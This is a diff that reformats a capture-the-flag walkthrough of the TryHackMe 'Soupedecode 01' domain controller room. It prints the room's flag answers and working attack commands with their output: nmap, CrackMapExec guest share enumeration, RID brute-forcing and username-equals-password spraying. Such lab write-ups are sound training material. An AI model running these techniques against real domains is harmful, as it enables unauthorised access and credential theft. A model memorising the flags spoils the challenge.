@@ -1,19 +1,25 @@
 # <div align='center'>[Soupedecode 01](https://tryhackme.com/room/soupedecode01)</div>
 <div align='center'>Test your enumeration skills on this boot-to-root machine.</div>
 <div align='center'>
-  
+  <img width="200" height="200" alt="xuper" src="https://github.com/user-attachments/assets/659ba37a-4640-4007-81fc-e6b11f6a7e2a" />
 </div>
 
+## Task 1. Soupedecode 01
 
----
+Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.
 
-Soupedecode 01 - TryHackMe Walkthrough (Active Directory Boot-to-Root)
-Introduction
+### What is the user flag?
+```
+28189316c25dd3c0ad56d44d000d62a8
+```
+### What is the root flag?
+```
+27cb2be302c388d63d27c86bfdd5f56a
+```
 
----
-
-Initial Enumeration
+## Initial Enumeration
 I began with an Nmap scan to identify open services and potential attack surfaces.
+```
 $ nmap -sV -sC -Pn 10.201.91.100
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
@@ -38,19 +44,20 @@ PORT     STATE SERVICE       VERSION
 |   DNS_Tree_Name: SOUPEDECODE.LOCAL
 |   Product_Version: 10.0.20348
 |_  System_Time: 2025-08-28T12:48:01+00:00
+```
 The scan revealed multiple services commonly associated with a Windows Domain Controller:
-DNS is open on port 53
-Kerberos is open on port 88
-LDAP is open on ports 389 & 3268
-SMB is open on port 445
-RDP is open on port 3389
+* **DNS** is open on port `53`
+* **Kerberos** is open on port `88`
+* **LDAP** is open on ports `389 & 3268`
+* **SMB** is open on port `445`
+* **RDP** is open on port `3389`
 
-Notably, the system exposed the domain name: SOUPEDECODE.LOCAL.
+Notably, the system exposed the domain name: **SOUPEDECODE.LOCAL.**
 
----
 
-SMB Share Enumeration
+## SMB Share Enumeration
 With SMB (445/tcp) open, my next step was to check if the guest user had access to any shares. I ran CrackMapExec with an empty password:
+```
 crackmapexec smb 10.201.91.100 -u 'guest' -p '' --shares
 SMB         10.201.91.100   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
 SMB         10.201.91.100   445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
@@ -64,19 +71,19 @@ SMB         10.201.91.100   445    DC01             IPC$            READ        
 SMB         10.201.91.100   445    DC01             NETLOGON                        Logon server share 
 SMB         10.201.91.100   445    DC01             SYSVOL                          Logon server share 
 SMB         10.201.91.100   445    DC01             Users
+```
 The results showed that authentication as guest was possible, and I could enumerate available shares:
-IPC$ → Read access (Remote IPC)
-ADMIN$, C$ → Default administrative shares
-NETLOGON & SYSVOL → Standard AD logon shares
-Users → Standard user profiles
-Backup → A non-standard share, though not accessible to the guest account
+* IPC$ → Read access (Remote IPC)
+* ADMIN$, C$ → Default administrative shares
+* NETLOGON & SYSVOL → Standard AD logon shares
+* Users → Standard user profiles
+* Backup → A non-standard share, though not accessible to the guest account
 
 This immediately stood out because unusual shares (like backup) often hide sensitive information such as credentials or configuration files.
 
----
-
-Attempting LDAP Enumeration
+## Attempting LDAP Enumeration
 After identifying LDAP services (389/tcp and 3268/tcp), I attempted to enumerate users with CrackMapExec:
+```
 crackmapexec ldap 10.201.91.100 -u "guest" -p "" --users
 SMB         10.201.91.100   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
 LDAP        10.201.91.100   445    DC01             [-] SOUPEDECODE.LOCAL\guest: Error connecting to the domain, are you sure LDAP service is running on the target?
@@ -94,27 +101,28 @@ SMB         10.201.91.100   445    DC01             502: SOUPEDECODE\krbtgt (Sid
 SMB         10.201.91.100   445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
 SMB         10.201.91.100   445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
 SMB         10.201.91.100   445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
+```
 This method was successful, and it returned a large list of domain users and groups.
 
----
-
-Exporting Users to a File
+## Exporting Users to a File
 To handle the volume of results, I used awk to extract usernames into a dedicated wordlist:
+```
 crackmapexec smb 10.201.91.100 -u 'guest' -p '' --rid-brute | awk '{split($6,a,"\\"); print a[2]}' > users.txt
+```
 This created a users.txt file containing all the enumerated usernames for further testing.
 
----
-
-Checking for Weak Credentials
+## Checking for Weak Credentials
 Next, I checked if any users had their username set as the password A common misconfiguration. CrackMapExec makes this easy:
+```
 crackmapexec smb 10.201.91.100 -u users.txt -p users.txt --no-bruteforce --continue-on-success
+```
 This command tests username=password logins, and I found at least one valid account using this weak setup.
 This quickly revealed valid credentials:
+```
 [+] SOUPEDECODE.LOCAL\ybob317 : ybob317
+```
 
----
-
-Enumerating SMB Shares with Valid Credentials
+## Enumerating SMB Shares with Valid Credentials
 With the discovered credentials, I enumerated accessible SMB shares:
 ```
 crackmapexec smb 10.201.91.100 -u 'ybob317' -p 'ybob317' --shares
@@ -221,11 +229,10 @@ Once inside, I navigated to the backup share and found a single interesting file
 
 <img width="1057" height="419" alt="image" src="https://github.com/user-attachments/assets/d0b709c5-e5f6-4d22-ab8a-189d425dfa1e" />
 
-
 I downloaded it:
-
+```
 get backup_extract.txt
-
+```
 Opening this file revealed a large dump of hashes, which will be the next target for cracking and potential privilege escalation.
 
 ## Cracking Backup Hashes → Gaining Access
@@ -273,4 +280,3 @@ type root.txt
 <img width="560" height="157" alt="image" src="https://github.com/user-attachments/assets/5835451a-0c66-4599-bc65-aa522c0d4c0b" />
 
 **Domain compromise achieved!**
-
